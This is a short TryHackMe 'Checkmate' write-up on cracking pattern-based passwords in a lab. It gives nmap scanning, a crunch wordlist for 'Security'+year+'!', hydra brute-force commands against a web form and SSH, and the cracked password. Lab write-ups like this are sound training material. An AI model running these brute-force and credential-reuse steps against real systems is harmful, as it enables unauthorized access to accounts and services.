# ♟️ Checkmate

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Checkmate](https://tryhackme.com/room/checkmate) |
| **Difficulty** | 🟢 Easy |
| **Category** | Brute Force, Password Security |
| **OS** | Linux |
| **Tools** | nmap, hydra, crunch |

---

## 🎯 Objective

Marco Bianchi reused weak, predictable, pattern-based passwords across multiple internal services. Exploit these weak passwords to gain full access.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV TARGET_IP
```

**Open ports:**
```
22/tcp   open  ssh
80/tcp   open  http
5001/tcp open  firewall console
5002/tcp open  employee portal
5003/tcp open  social platform
```

---

## 💥 Exploitation

**Step 1 — Web portal (port 80)**

Default/weak credentials work:
```
Username: marco
Password: (guessable pattern based on username)
```

**Step 2 — Firewall console (port 5001)**

Password follows a pattern: `Security` + year + `!`
```bash
crunch 13 13 -t Security20%%! -o passwords.txt
hydra -l marco -P passwords.txt TARGET_IP -s 5001 http-post-form "/:username=^USER^&password=^PASS^:incorrect"
```

**Found:** `Security2024!`

**Step 3 — SSH (port 22)**

```bash
hydra -l marco -P /usr/share/wordlists/rockyou.txt TARGET_IP ssh
```

Each service reveals the flag for that level.

---

## 📚 Lessons Learned

- Password reuse across services is one of the most common and dangerous mistakes
- Pattern-based passwords (Company+Year+Symbol) are trivially crackable with custom wordlists
- `crunch` generates targeted wordlists based on known patterns — far more efficient than rockyou for targeted attacks
- Each compromised credential should be tested against all other services immediately

---
*by OwlRC 🦉 | github.com/OwlRC*
